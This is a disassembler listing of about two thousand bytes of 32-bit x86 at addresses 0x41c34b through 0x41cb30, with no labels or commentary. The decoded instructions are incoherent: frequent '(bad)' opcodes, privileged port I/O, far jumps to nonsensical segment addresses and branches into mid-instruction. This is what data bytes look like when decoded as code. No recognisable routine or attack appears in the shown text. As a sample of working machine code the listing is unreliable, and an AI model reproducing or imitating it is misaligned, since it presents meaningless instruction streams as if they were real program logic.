  41c34b:	or     esp,ecx
  41c34d:	repz div ebp
  41c350:	mov    bh,0xc7
  41c352:	retf   0xf1ea
  41c355:	in     al,dx
  41c356:	out    dx,al
  41c357:	mov    bh,0xf0
  41c359:	fst    st(0)
  41c35b:	test   dl,0xec
  41c35e:	ret    
  41c35f:	mov    esp,0xc5c6d1d5
  41c364:	jmp    0xdcca:0xd4caf8fb
  41c36b:	in     eax,dx
  41c36c:	(bad)  
  41c36d:	shl    edx,1
  41c36f:	scas   eax,DWORD PTR es:[edi]
  41c370:	mov    ch,0xd6
  41c372:	jecxz  0x41c362
  41c374:	mov    al,0xe0
  41c376:	mov    ebx,0xd8ffc4da
  41c37b:	aam    0xee
  41c37d:	(bad)  
  41c37f:	cld    
  41c380:	repnz add cl,ah
  41c383:	rol    dh,cl
  41c385:	aam    0xf9
  41c387:	fisttp QWORD PTR [esi+eiz*8]
  41c38a:	add    al,BYTE PTR [edi]
  41c38c:	lock lock lods eax,DWORD PTR ds:[esi]
  41c38f:	ret    
  41c390:	shl    eax,cl
  41c392:	jmp    0xeb349f8b
  41c397:	repnz dec ecx
  41c39a:	test   DWORD PTR [ebx],0xbfe3bc03
  41c3a0:	add    ebx,ebp
  41c3a2:	ret    
  41c3a3:	mov    esp,0xea040704
  41c3a8:	cmc    
  41c3a9:	vpslld xmm5,xmm7,xmm1
  41c3ad:	(bad)
  41c3b2:	(bad)  
  41c3b3:	shl    ebp,1
  41c3b5:	out    dx,eax
  41c3b6:	(bad)
  41c3b9:	out    dx,eax
  41c3ba:	into   
  41c3bb:	fabs   
  41c3bd:	stc    
  41c3be:	mov    esp,0xfe0be5c2
  41c3c3:	cld    
  41c3c4:	sti    
  41c3c5:	jecxz  0x41c3ca
  41c3c7:	fsub   st,st(0)
  41c3c9:	into   
  41c3ca:	add    eax,DWORD PTR [edi]
  41c3cc:	test   al,0xf3
  41c3ce:	out    dx,al
  41c3cf:	scas   al,BYTE PTR es:[edi]
  41c3d0:	in     eax,0xc8
  41c3d2:	mov    cl,0xc8
  41c3d4:	div    eax
  41c3d6:	test   ebp,0xe2ebf0b8
  41c3dc:	mov    bh,0x7
  41c3de:	repz add ah,dl
  41c3e1:	clc    
  41c3e2:	fld    DWORD PTR [ebx]
  41c3e4:	leave  
  41c3e5:	(bad)  
  41c3e7:	loopne 0x41c3c6
  41c3e9:	out    0xdb,eax
  41c3eb:	rol    al,0xea
  41c3ee:	loope  0x41c394
  41c3f0:	mov    bl,0xc0
  41c3f2:	(bad)  
  41c3f4:	fxtract 
  41c3f6:	aam    0xc8
  41c3f8:	mov    ecx,0xf7d8eeeb
  41c3fd:	sti    
  41c3fe:	cli    
  41c3ff:	out    0xec,eax
  41c401:	add    eax,ebx
  41c403:	jmp    0x41c3e7
  41c405:	inc    BYTE PTR [edi]
  41c407:	call   0xea07c3d4
  41c40c:	(bad)  
  41c40d:	loopne 0x41c3bd
  41c40f:	jmp    0x41c3e6
  41c411:	out    dx,eax
  41c412:	ret    
  41c413:	icebp  
  41c414:	(bad)
  41c417:	fcmovbe st,st(3)
  41c419:	push   DWORD PTR [ecx-0x3d400021]
  41c41f:	cmc    
  41c420:	add    ch,bh
  41c422:	(bad)  
  41c423:	fimul  WORD PTR [ecx]
  41c425:	leave  
  41c426:	stc    
  41c427:	retf   
  41c428:	(bad)  
  41c42a:	fabs   
  41c42c:	loopne 0x41c3f5
  41c42e:	mov    edi,0xa9c4e5c0
  41c433:	ret    0xeeee
  41c436:	sti    
  41c437:	not    ecx
  41c439:	aam    0xcd
  41c43b:	add    DWORD PTR [eax+0x1b8b9d0],edi
  41c441:	(bad)
  41c444:	call   0xf06c026
  41c449:	retf   
  41c44a:	stc    
  41c44b:	jmp    0x41c418
  41c44d:	fsub   st,st(7)
  41c44f:	imul   ebx
  41c451:	(bad)  
  41c452:	retf   0xf3c9
  41c455:	(bad)  
  41c456:	out    dx,eax
  41c457:	in     eax,0xe9
  41c459:	(bad)  
  41c45a:	retf   0xe9df
  41c45d:	into   
  41c45e:	int    0xd1
  41c460:	shl    esi,0xc5
  41c463:	or     ebx,eax
  41c465:	fmulp  st(7),st
  41c467:	fsubr  st(6),st
  41c469:	(bad)
  41c46c:	stos   BYTE PTR es:[edi],al
  41c46d:	int    0xbd
  41c46f:	cmc    
  41c470:	ret    
  41c471:	mov    cl,0xc8
  41c473:	in     eax,dx
  41c474:	sar    DWORD PTR [edx-0x2462a17],0xf2
  41c47b:	lock bnd ret 0xe307
  41c480:	idiv   DWORD PTR [ebp-0x343b04fc]
  41c486:	(bad)  
  41c489:	fsub   st(0),st
  41c48b:	or     ah,ah
  41c48d:	test   ecx,0xb1eee1ac
  41c493:	mov    ch,0xc0
  41c495:	jmp    0xfdb9:0xd1b5d7e4
  41c49c:	mov    edx,0xbbd1d6fa
  41c4a1:	std    
  41c4a2:	cli    
  41c4a3:	mov    esp,0xe004ee02
  41c4a9:	cld    
  41c4aa:	jecxz  0x41c4ad
  41c4ac:	out    dx,eax
  41c4ad:	out    0xbe,eax
  41c4af:	rol    ch,1
  41c4b1:	mov    al,0xf2
  41c4b3:	retf   0xf0e5
  41c4b6:	stc    
  41c4b7:	shr    ebp,1
  41c4b9:	mov    ebx,0xbcf3f9de
  41c4be:	(bad)  
  41c4bf:	test   bh,0xfb
  41c4c2:	shl    ecx,0xfb
  41c4c5:	add    ch,bl
  41c4c7:	loopne 0x41c4c7
  41c4c9:	call   0xb40691bd
  41c4ce:	in     al,0xf5
  41c4d0:	loopne 0x41c4a7
  41c4d2:	(bad)  
  41c4d3:	jmp    0x41c499
  41c4d5:	in     eax,0xe5
  41c4d7:	lds    esi,FWORD PTR [esi-0x41083424]
  41c4dd:	out    0xc0,eax
  41c4df:	(bad)  
  41c4e1:	mov    ebp,0xf7dcb8fa
  41c4e6:	sti    
  41c4e7:	sti    
  41c4e8:	retf   
  41c4e9:	aam    0x1
  41c4eb:	add    al,0xe1
  41c4ed:	ret    0xe3c5
  41c4f0:	jmp    0xf6317ce5
  41c4f5:	fidivr DWORD PTR [edx-0x260a4611]
  41c4fb:	mov    edx,0xfdf6eecf
  41c500:	out    0xe5,al
  41c502:	loope  0x41c4e0
  41c504:	retf   
  41c505:	clc    
  41c506:	jmp    0x41c4ec
  41c508:	or     al,0x4
  41c50a:	repnz leave 
  41c50c:	in     eax,dx
  41c50d:	imul   ecx
  41c50f:	in     eax,dx
  41c510:	ret    0xf7ca
  41c513:	hlt    
  41c514:	vpsubd xmm6,xmm2,xmm6
  41c518:	into   
  41c519:	fmulp  st(0),st
  41c51b:	jmp    0x2d0:0xfcdbe8dd
  41c522:	(bad)  
  41c523:	(bad)  
  41c524:	lock add esp,esp
  41c527:	pmulhuw mm0,QWORD PTR [eax]
  41c52a:	add    cl,ch
  41c52c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c52d:	out    dx,eax
  41c52e:	(bad)  
  41c52f:	jmp    0xc4ed:0xecd1aed1
  41c536:	(bad)  
  41c537:	fnstsw WORD PTR [edx-0xb29280e]
  41c53d:	shl    BYTE PTR [ebp-0x52a0c02],1
  41c543:	cld    
  41c544:	retf   0xfc5
  41c547:	in     al,0xf4
  41c549:	cld    
  41c54a:	retf   
  41c54b:	or     bl,dh
  41c54d:	shl    BYTE PTR [edx-0x2d10370e],0xf5
  41c554:	rcl    dl,0xcd
  41c557:	lock int 0xfe
  41c55a:	mov    ch,0xcd
  41c55c:	jecxz  0x41c550
  41c55e:	mov    esi,0xd5bddae7
  41c563:	fadd   DWORD PTR [eax]
  41c565:	jmp    0x41c54d
  41c567:	jmp    0x41c56e
  41c569:	faddp  st(1),st
  41c56b:	in     eax,dx
  41c56c:	out    dx,al
  41c56d:	mov    esi,0xb3e0c3c7
  41c572:	aam    0xf3
  41c574:	(bad)  
  41c575:	retf   0xe9d4
  41c578:	sti    
  41c579:	leave  
  41c57a:	fdiv   st,st(5)
  41c57c:	(bad)  
  41c57d:	loopne 0x41c53c
  41c57f:	repnz sti 
  41c581:	lock (bad) 
  41c583:	fadd   QWORD PTR [esp+eiz*8]
  41c586:	std    
  41c587:	fisttp DWORD PTR [esi]
  41c589:	fmulp  st(2),st
  41c58b:	(bad)  
  41c58d:	fisubr WORD PTR [ebp-0x3c39091f]
  41c593:	call   0xe03a9879
  41c598:	aam    0xbd
  41c59a:	shl    BYTE PTR [eax-0xb2e0927],1
  41c5a0:	(bad)  
  41c5a1:	rol    ch,1
  41c5a3:	jecxz  0x41c56b
  41c5a5:	fadd   DWORD PTR ds:0xef01de01
  41c5ab:	in     eax,0xbe
  41c5ad:	loopne 0x41c5a2
  41c5af:	scas   al,BYTE PTR es:[edi]
  41c5b0:	leave  
  41c5b1:	in     eax,0xf0
  41c5b3:	cmc    
  41c5b4:	stc    
  41c5b5:	clc    
  41c5b6:	retf   
  41c5b7:	hlt    
  41c5b8:	mov    ebx,0x3b0d0f3
  41c5bd:	fsubrp st(7),st
  41c5bf:	icebp  
  41c5c0:	loope  0x41c5ae
  41c5c2:	push   es
  41c5c3:	lock idiv bh
  41c5c6:	fsubr  st,st(2)
  41c5c8:	in     eax,0xe3
  41c5ca:	int3   
  41c5cb:	into   
  41c5cc:	mov    esp,0xd2b2cbca
  41c5d1:	aad    0xd4
  41c5d3:	stc    
  41c5d4:	sti    
  41c5d5:	mov    eax,0xcaf7c5f1
  41c5da:	in     al,dx
  41c5db:	idiv   eax
  41c5dd:	loop   0x41c59b
  41c5df:	(bad)  
  41c5e0:	out    0xeb,eax
  41c5e2:	out    0xe9,eax
  41c5e4:	fld    QWORD PTR [ebx]
  41c5e6:	in     eax,0xca
  41c5e8:	retf   
  41c5e9:	pavgw  mm1,QWORD PTR [esi]
  41c5ec:	shr    BYTE PTR [edx-0xe372315],cl
  41c5f2:	cli    
  41c5f3:	shl    edx,0xf1
  41c5f6:	call   0xff34bcce
  41c5fb:	leave  
  41c5fc:	(bad)  
  41c5fd:	(bad)  
  41c5ff:	int3   
  41c600:	add    dh,dl
  41c602:	fsub   st,st(6)
  41c604:	retf   
  41c605:	add    edi,edx
  41c607:	fsubr  st,st(3)
  41c609:	retf   
  41c60a:	in     al,dx
  41c60b:	fucomp st(6)
  41c60d:	out    dx,al
  41c60e:	shl    bh,1
  41c610:	xlat   BYTE PTR ds:[ebx]
  41c611:	in     al,0xcb
  41c613:	sti    
  41c614:	out    0xc5,al
  41c616:	int3   
  41c617:	fsubp  st(7),st
  41c619:	(bad)  
  41c61a:	jmp    0x41c5fa
  41c61c:	call   0xde01a0fc
  41c621:	push   es
  41c622:	fcomi  st,st(6)
  41c624:	fdivr  st(0),st
  41c626:	add    al,0xee
  41c628:	add    eax,edx
  41c62a:	out    0xc8,al
  41c62c:	jmp    0xf5ca:0xe7b6c4d0
  41c633:	jmp    0xf601a12c
  41c638:	icebp  
  41c639:	mov    dl,0xd2
  41c63b:	jmp    0xd328973d
  41c640:	shl    esi,0x4
  41c643:	fld    st(1)
  41c645:	(bad)  
  41c646:	jmp    0x41c621
  41c648:	add    DWORD PTR [ecx],ecx
  41c64a:	stc    
  41c64b:	add    esp,esp
  41c64d:	fcom   st(1)
  41c64f:	jmp    0x41c619
  41c651:	stos   BYTE PTR es:[edi],al
  41c652:	enter  0xe1b4,0xc0
  41c656:	aam    0xf3
  41c658:	xlat   BYTE PTR ds:[ebx]
  41c659:	int3   
  41c65a:	mov    esi,0xfcf7e0bd
  41c65f:	loope  0x41c646
  41c661:	out    0x1,eax
  41c663:	les    edi,FWORD PTR [edi-0x1635f1fa]
  41c669:	(bad)  
  41c66a:	retf   
  41c66b:	or     ebp,DWORD PTR [ecx-0x530d1a43]
  41c671:	retf   
  41c672:	lods   eax,DWORD PTR ds:[esi]
  41c673:	int    0xb9
  41c675:	(bad)  
  41c678:	aam    0xbc
  41c67a:	ret    
  41c67b:	test   ch,0xd5
  41c67e:	(bad)  
  41c67f:	ffreep st(3)
  41c681:	mov    ebp,0xc7f0cafe
  41c686:	enter  0xfbfc,0xee
  41c68a:	(bad)  
  41c68b:	in     eax,dx
  41c68c:	out    0xc9,eax
  41c68e:	lock mov dl,0xf5
  41c691:	int3   
  41c692:	loopne 0x41c64b
  41c694:	fcmovb st,st(5)
  41c696:	mov    ebx,0xc9fff6f9
  41c69b:	out    dx,eax
  41c69c:	cmc    
  41c69d:	mov    esi,0xbc200e0
  41c6a2:	hlt    
  41c6a3:	loop   0x41c686
  41c6a5:	(bad)  
  41c6a7:	retf   0xecc6
  41c6aa:	push   es
  41c6ab:	stc    
  41c6ac:	in     al,dx
  41c6ad:	repz out dx,al
  41c6af:	test   al,0xef
  41c6b1:	leave  
  41c6b2:	int    0xc2
  41c6b4:	ror    cl,1
  41c6b6:	int3   
  41c6b7:	int3   
  41c6b8:	xlat   BYTE PTR ds:[ebx]
  41c6b9:	(bad)  
  41c6bb:	shl    edx,cl
  41c6bd:	inc    BYTE PTR [edx]
  41c6bf:	add    DWORD PTR [esi-0x7fc4342],edi
  41c6c5:	or     ebp,ecx
  41c6c7:	jmp    0x120dc6d9
  41c6cc:	mov    cl,0xc8
  41c6ce:	out    0xcc,eax
  41c6d0:	rep lods al,BYTE PTR ds:[esi]
  41c6d2:	lods   eax,DWORD PTR ds:[esi]
  41c6d3:	in     eax,0xda
  41c6d5:	xlat   BYTE PTR ds:[ebx]
  41c6d6:	in     al,dx
  41c6d7:	mov    eax,0xbcdef4b5
  41c6dc:	repnz (bad) 
  41c6de:	fucom  st(6)
  41c6e0:	int    0xfd
  41c6e2:	jmp    0x2cb:0xd6c0d0e1
  41c6e9:	add    ch,bh
  41c6eb:	add    ah,dh
  41c6ed:	shl    edi,cl
  41c6ef:	div    bl
  41c6f1:	ror    cl,0xec
  41c6f4:	fisubr DWORD PTR [esi-0x2d0d2c4a]
  41c6fa:	(bad)  
  41c6fc:	shl    eax,1
  41c6fe:	jecxz  0x41c6bf
  41c700:	(bad)  
  41c702:	not    edi
  41c704:	ror    eax,0xe9
  41c707:	out    0x5,eax
  41c709:	call   0xf203b31b
  41c70e:	mov    esp,0xb0f4eae1
  41c713:	enter  0xf7e7,0xcf
  41c717:	mov    edi,0xe2ecb9f0
  41c71c:	hlt    
  41c71d:	ret    0xc707
  41c720:	(bad)  
  41c722:	jecxz  0x41c714
  41c724:	or     ah,al
  41c726:	loop   0x41c6ec
  41c728:	(bad)  
  41c729:	fimul  DWORD PTR [ebx]
  41c72b:	repz in al,0xe3
  41c72e:	xlat   BYTE PTR ds:[ebx]
  41c72f:	in     al,dx
  41c730:	ret    0xe1d3
  41c733:	(bad)
  41c736:	div    al
  41c738:	mov    ah,0xf4
  41c73a:	call   esp
  41c73c:	mov    esi,0xdbe5d8b8
  41c741:	repnz inc DWORD PTR [edx]
  41c744:	vpsubusb xmm7,xmm2,xmm6
  41c748:	hlt    
  41c749:	ret    0xebff
  41c74c:	ffree  st(0)
  41c74e:	test   bh,0xd2
  41c751:	mov    cl,0xc3
  41c753:	into   
  41c754:	jmp    0xdc41c734
  41c759:	ror    ebx,cl
  41c75b:	sti    
  41c75c:	(bad)  
  41c75d:	fcmovnu st,st(6)
  41c75f:	mov    ebp,0xb8bddaf7
  41c764:	leave  
  41c765:	mov    esi,0xaced6f6
  41c76a:	fisttp DWORD PTR [edx]
  41c76c:	retf   
  41c76d:	lods   al,BYTE PTR ds:[esi]
  41c76e:	in     eax,0xe6
  41c770:	in     al,dx
  41c771:	lods   al,BYTE PTR ds:[esi]
  41c772:	rol    dh,1
  41c774:	jmp    0x41c766
  41c776:	icebp  
  41c777:	(bad)  
  41c778:	ror    esi,1
  41c77a:	retf   0xdc02
  41c77d:	shl    esi,1
  41c77f:	ret    
  41c780:	add    eax,0xeac205db
  41c785:	loope  0x41c790
  41c787:	or     cl,BYTE PTR ds:0xc50bf8e2
  41c78d:	ret    0xc9c1
  41c790:	retf   0xdbee
  41c793:	ftst   
  41c795:	vpsrld ymm6,ymm5,xmm4
  41c799:	mov    ebp,0xefbebffb
  41c79e:	stc    
  41c79f:	int3   
  41c7a0:	(bad)  
  41c7a3:	shr    al,1
  41c7a5:	or     edx,esp
  41c7a7:	hlt    
  41c7a8:	loope  0x41c790
  41c7aa:	pop    es
  41c7ab:	(bad)  
  41c7ac:	lock into 
  41c7ae:	iret   
  41c7af:	shr    esi,1
  41c7b1:	ret    
  41c7b2:	fcmovne st,st(2)
  41c7b4:	(bad)  
  41c7b5:	xlat   BYTE PTR ds:[ebx]
  41c7b6:	mov    eax,0xe9dfe5e9
  41c7bb:	in     al,dx
  41c7bc:	clc    
  41c7bd:	repz fsubr st(3),st
  41c7c0:	rcr    esp,0xf1
  41c7c3:	mov    esp,0xfbc0e4d6
  41c7c8:	loope  0x41c7d5
  41c7ca:	retf   0xe1ca
  41c7cd:	fstp   st(4)
  41c7cf:	scas   eax,DWORD PTR es:[edi]
  41c7d0:	xlat   BYTE PTR ds:[ebx]
  41c7d1:	mov    dh,0xa9
  41c7d3:	mov    dh,0xd1
  41c7d5:	in     eax,dx
  41c7d6:	out    dx,eax
  41c7d7:	lods   al,BYTE PTR ds:[esi]
  41c7d8:	icebp  
  41c7d9:	out    dx,eax
  41c7da:	mov    ebp,0xddf7c2cd
  41c7df:	add    bl,dl
  41c7e1:	add    al,0xe2
  41c7e3:	aam    0xdb
  41c7e5:	in     eax,0xfa
  41c7e7:	(bad)  
  41c7e9:	push   cs
  41c7ea:	jecxz  0x41c7d7
  41c7ec:	test   eax,0xd0b6c9c9
  41c7f1:	shr    DWORD PTR [esp+esi*4-0x282f060d],cl
  41c7f8:	aad    0xcd
  41c7fa:	shl    ecx,1
  41c7fc:	cli    
  41c7fd:	add    al,dl
  41c7ff:	mov    ebp,0xc5bcecfc
  41c804:	add    dl,dh
  41c806:	cli    
  41c807:	(bad)  
  41c808:	fsub   st(0),st
  41c80a:	push   cs
  41c80b:	add    cl,dl
  41c80d:	retf   0xc3e0
  41c810:	(bad)  
  41c811:	loopne 0x41c7e1
  41c813:	xbegin 0x2eb4ef
  41c819:	mov    dh,0x3
  41c81b:	(bad)  
  41c81c:	leave  
  41c81d:	(bad)  
  41c81f:	fcmovu st,st(5)
  41c821:	shl    dh,1
  41c823:	fadd   st(1),st
  41c825:	sar    bh,0xea
  41c828:	iret   
  41c829:	(bad)  
  41c82c:	stos   DWORD PTR es:[edi],eax
  41c82d:	in     al,0xdd
  41c82f:	(bad)  
  41c830:	out    0xd0,eax
  41c832:	mov    cl,0xd4
  41c834:	shl    esi,1
  41c836:	retf   
  41c837:	sti    
  41c838:	call   0xf83f9f0c
  41c83d:	add    cl,ah
  41c83f:	(bad)  
  41c841:	ret    
  41c842:	not    al
  41c844:	loopne 0x41c81b
  41c846:	in     al,0xc7
  41c848:	out    dx,al
  41c849:	iret   
  41c84a:	add    cl,BYTE PTR [ebx]
  41c84c:	scas   al,BYTE PTR es:[edi]
  41c84d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c84e:	fisubr WORD PTR [esi-0x2d280944]
  41c854:	mov    bl,0xb8
  41c856:	clc    
  41c857:	xlat   BYTE PTR ds:[ebx]
  41c858:	mov    ch,0xf4
  41c85a:	in     al,dx
  41c85b:	loop   0x41c849
  41c85d:	mov    dh,0xf3
  41c85f:	cld    
  41c860:	loope  0x41c828
  41c862:	pop    es
  41c863:	add    bl,ch
  41c865:	neg    edi
  41c867:	add    eax,0xdaf2ca04
  41c86c:	test   al,0xad
  41c86e:	out    dx,eax
  41c86f:	rcl    eax,cl
  41c871:	mov    bh,0xb7
  41c873:	out    dx,al
  41c874:	hlt    
  41c875:	rcl    ah,0xba
  41c878:	int    0xed
  41c87a:	out    dx,al
  41c87b:	mov    al,0xfe
  41c87d:	loop   0x41c854
  41c87f:	push   es
  41c880:	fdiv   st,st(3)
  41c882:	std    
  41c883:	loopne 0x41c844
  41c885:	mov    DWORD PTR [edx],0xeffcb00
  41c88b:	out    dx,al
  41c88c:	(bad)  
  41c88d:	fcom   st(3)
  41c88f:	iret   
  41c890:	jmp    0x41c872
  41c892:	(bad)  
  41c893:	mov    bh,0xf7
  41c895:	mov    eax,0xd8fcc9f0
  41c89a:	mov    ecx,0xf5f9fcfc
  41c89f:	out    0xe4,eax
  41c8a1:	loopne 0x41c886
  41c8a3:	add    ch,dl
  41c8a5:	cmc    
  41c8a6:	jecxz  0x41c8b3
  41c8a8:	leave  
  41c8a9:	in     al,0xfe
  41c8ab:	rcl    edx,cl
  41c8ad:	repz icebp 
  41c8af:	ret    0xe0ca
  41c8b2:	xlat   BYTE PTR ds:[ebx]
  41c8b3:	rol    ch,1
  41c8b5:	aam    0xd5
  41c8b7:	(bad)  
  41c8b8:	shr    cl,cl
  41c8ba:	sti    
  41c8bb:	fcmovnu st,st(7)
  41c8bd:	int3   
  41c8be:	ret    
  41c8bf:	(bad)  
  41c8c0:	fnsetpm(287 only) 
  41c8c2:	add    eax,0xd6ebd4d7
  41c8c7:	call   0xcd23a296
  41c8cc:	in     al,0xa6
  41c8ce:	icebp  
  41c8cf:	rcl    al,cl
  41c8d1:	fcmovnb st,st(7)
  41c8d3:	repnz scas eax,DWORD PTR es:[edi]
  41c8d5:	repz lock enter 0xcce5,0xf9
  41c8db:	call   0xf548c3e1
  41c8e0:	repz fcmovb st,st(0)
  41c8e3:	cli    
  41c8e4:	fiadd  WORD PTR [esi]
  41c8e6:	lar    eax,WORD PTR ds:0xd9ea0bdc
  41c8ed:	(bad)  
  41c8ee:	into   
  41c8ef:	mov    cl,0xc3
  41c8f1:	out    0xca,eax
  41c8f3:	sar    edx,0xc8
  41c8f6:	int3   
  41c8f7:	(bad)  
  41c8f8:	sar    DWORD PTR [ebx-0x61ffd0d],1
  41c8fe:	aad    0xbf
  41c900:	not    edx
  41c902:	repz shl ah,1
  41c905:	or     edi,ebx
  41c907:	aam    0x5
  41c909:	sti    
  41c90a:	pop    es
  41c90b:	pop    es
  41c90c:	mov    ecx,0xc9c6c8c2
  41c911:	test   bh,0xfa
  41c914:	mov    bl,0xf1
  41c916:	out    dx,al
  41c917:	clc    
  41c918:	fdivrp st(0),st
  41c91a:	mov    esi,0xd8f6bfd1
  41c91f:	out    0xc1,al
  41c921:	faddp  st(4),st
  41c923:	jmp    0x41c8f0
  41c925:	add    eax,ecx
  41c927:	iret   
  41c928:	pop    es
  41c929:	aam    0xe6
  41c92b:	loope  0x41c8fd
  41c92d:	in     eax,dx
  41c92e:	fbstp  TBYTE PTR [edx-0x491c2e3d]
  41c934:	out    0xf4,eax
  41c936:	retf   0xedfa
  41c939:	call   0xed13ca40
  41c93e:	add    ecx,esi
  41c940:	(bad)  
  41c941:	dec    bl
  41c943:	retf   0xd9c6
  41c946:	(bad)  
  41c948:	out    0xb,al
  41c94a:	fld    st(4)
  41c94c:	loope  0x41c941
  41c94e:	(bad)  
  41c94f:	out    dx,eax
  41c950:	scas   al,BYTE PTR es:[edi]
  41c951:	(bad)  
  41c952:	mov    ah,0xd3
  41c954:	lock ror edi,1
  41c957:	fdiv   st,st(3)
  41c959:	mov    esi,0xf9f8f4fd
  41c95e:	int3   
  41c95f:	mov    ah,0xf8
  41c961:	shl    esp,1
  41c963:	fadd   QWORD PTR ds:0xddfac4fe
  41c969:	ret    0x1e9
  41c96c:	shl    BYTE PTR [ebx-0x4f381250],0xf4
  41c973:	rcr    ebx,0xf0
  41c976:	jmp    0xb1fdb265
  41c97b:	shl    ecx,cl
  41c97d:	mov    ebp,0xd9fbe0be
  41c982:	cmc    
  41c983:	fdiv   st(1),st
  41c985:	jmp    0x41c989
  41c987:	out    0xe5,al
  41c989:	cli    
  41c98a:	push   cs
  41c98b:	xcrypt-ctr (bad)
  41c98c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c98d:	fsubrp st(0),st
  41c98f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c990:	cmc    
  41c991:	aam    0xcf
  41c993:	retf   0xb7c6
  41c996:	clc    
  41c997:	(bad)  
  41c998:	clc    
  41c999:	(bad)  
  41c99b:	sti    
  41c99c:	fadd   st,st(0)
  41c99e:	cld    
  41c99f:	ret    0xecd1
  41c9a2:	clc    
  41c9a3:	(bad)  
  41c9a5:	rcr    ch,0xdd
  41c9a8:	add    eax,0xcfd80305
  41c9ad:	icebp  
  41c9ae:	scas   eax,DWORD PTR es:[edi]
  41c9af:	(bad)  
  41c9b0:	lock int 0xce
  41c9b3:	sti    
  41c9b4:	sar    DWORD PTR [ebx-0x1b2f172a],1
  41c9ba:	jmp    0xbdf8a48c
  41c9bf:	shl    ecx,cl
  41c9c1:	hlt    
  41c9c2:	in     eax,0xd4
  41c9c4:	clc    
  41c9c5:	cld    
  41c9c6:	cmc    
  41c9c7:	jmp    0xe042c4d0
  41c9cc:	call   0xe4047db9
  41c9d1:	shl    DWORD PTR [edx-0x94a0d11],cl
  41c9d7:	(bad)  
  41c9d8:	mov    bh,0xc9
  41c9da:	rcl    cl,cl
  41c9dc:	sar    ecx,1
  41c9de:	rcr    cl,0xcd
  41c9e1:	in     al,dx
  41c9e2:	jmp    0xc9c5:0xfadecafd
  41c9e9:	leave  
  41c9ea:	stc    
  41c9eb:	into   
  41c9ec:	(bad)  
  41c9ed:	leave  
  41c9ee:	in     al,dx
  41c9ef:	xlat   BYTE PTR ds:[ebx]
  41c9f0:	aam    0xc1
  41c9f2:	(bad)  
  41c9f3:	out    dx,eax
  41c9f4:	shr    BYTE PTR [esi-0x2133029],cl
  41c9fa:	out    dx,eax
  41c9fb:	ret    
  41c9fc:	fcmove st,st(5)
  41c9fe:	mov    eax,0xfad0d3c1
  41ca03:	retf   0xc4e2
  41ca06:	retf   
  41ca07:	(bad)  
  41ca09:	loopne 0x41c9e4
  41ca0b:	(bad)  
  41ca0d:	repz repz loopne 0x41c9f7
  41ca11:	xlat   BYTE PTR ds:[ebx]
  41ca12:	int    0xc4
  41ca14:	out    0xf2,eax
  41ca16:	fcmovne st,st(0)
  41ca18:	aam    0xd0
  41ca1a:	idiv   BYTE PTR [ebx-0x391c4744]
  41ca20:	rol    BYTE PTR [edx],cl
  41ca22:	(bad)  
  41ca24:	in     eax,0xb
  41ca26:	pinsrw mm0,WORD PTR ds:0xc6eae9ea,0xc2
  41ca2e:	test   al,0xe6
  41ca30:	rcl    dh,0xef
  41ca33:	rcl    edx,0xd7
  41ca36:	fcmovu st,st(7)
  41ca38:	cmc    
  41ca39:	aad    0xb8
  41ca3b:	int    0xd4
  41ca3d:	(bad)  
  41ca3f:	fst    st(0)
  41ca41:	imul   bl
  41ca43:	mov    eax,0xda0408
  41ca48:	ret    
  41ca49:	push   es
  41ca4a:	clc    
  41ca4b:	push   cs
  41ca4c:	fdiv   DWORD PTR [ebx-0x4d510858]
  41ca52:	int3   
  41ca53:	mov    al,0xb7
  41ca55:	rcr    edx,1
  41ca57:	cmc    
  41ca58:	mov    bl,0xcf
  41ca5a:	clc    
  41ca5b:	rol    dl,cl
  41ca5d:	mov    ecx,0xc5bfe0f4
  41ca62:	mov    ecx,0x2c70b05
  41ca67:	add    al,0xd4
  41ca69:	mov    ah,0xe0
  41ca6c:	call   0xad007041
  41ca71:	shl    DWORD PTR [ecx-0x1030282f],1
  41ca77:	shl    DWORD PTR [esp+eax*8-0x2173635],1
  41ca7e:	into   
  41ca7f:	ret    
  41ca80:	repz std 
  41ca82:	neg    dh
  41ca84:	fimul  WORD PTR [ebx]
  41ca86:	pop    es
  41ca87:	cmc    
  41ca88:	into   
  41ca89:	jecxz  0x41ca69
  41ca8b:	(bad)  
  41ca8c:	jmp    0xebe9:0xd3d1afc4
  41ca93:	rcr    al,0xca
  41ca96:	cmc    
  41ca97:	retf   0xccca
  41ca9a:	int    0xf0
  41ca9c:	(bad)  
  41ca9e:	ret    0xf0c7
  41caa1:	in     al,dx
  41caa2:	fimul  DWORD PTR [edx]
  41caa4:	mov    edi,0xc3e6c909
  41caa9:	or     bl,dl
  41caab:	adc    ebx,eax
  41caad:	rol    ebx,cl
  41caaf:	(bad)  
  41cab0:	test   eax,0xd6e8bbe3
  41cab6:	(bad)  
  41cab8:	hlt    
  41cab9:	fcomip st,st(3)
  41cabb:	out    dx,al
  41cabc:	add    cl,al
  41cabe:	lock (bad) 
  41cac0:	aad    0xc1
  41cac2:	(bad)  
  41cac4:	retf   
  41cac5:	les    edi,FWORD PTR [ebp+0x6dfc902]
  41cacb:	push   es
  41cacc:	loop   0x41ca9a
  41cace:	icebp  
  41cacf:	cmc    
  41cad0:	mov    al,0xe4
  41cad2:	jecxz  0x41cab9
  41cad4:	enter  0xdfcf,0xc4
  41cad8:	repz repnz loop 0x41ca98
  41cadc:	out    dx,al
  41cadd:	mov    dh,0xd8
  41cadf:	fistp  QWORD PTR [esi-0x63f051c]
  41cae5:	(bad)
  41cae8:	aam    0xce
  41caea:	out    0x12,eax
  41caec:	loope  0x41cab9
  41caee:	lock mov esi,0xf8f1d5c2
  41caf5:	leave  
  41caf6:	shl    BYTE PTR [edi-0x41302a36],cl
  41cafc:	mov    ebp,0xdcecf102
  41cb01:	out    0xdd,al
  41cb03:	hlt    
  41cb04:	ror    ebx,1
  41cb06:	xlat   BYTE PTR ds:[ebx]
  41cb07:	loop   0x41caee
  41cb09:	out    0x7,al
  41cb0b:	or     ebx,edx
  41cb0d:	test   ecx,0xdaf2e0a4
  41cb13:	loop   0x41cacf
  41cb15:	repz sti 
  41cb17:	div    BYTE PTR [edi-0x25fd2b45]
  41cb1d:	out    dx,al
  41cb1e:	mov    edi,0xc2f5e4dd
  41cb23:	(bad)  
  41cb25:	sti    
  41cb26:	add    eax,0x8fa06f6
  41cb2b:	or     ebx,esp
  41cb2d:	ror    eax,0xf2
  41cb30:	mov    ebp,0xf6d7dbd6
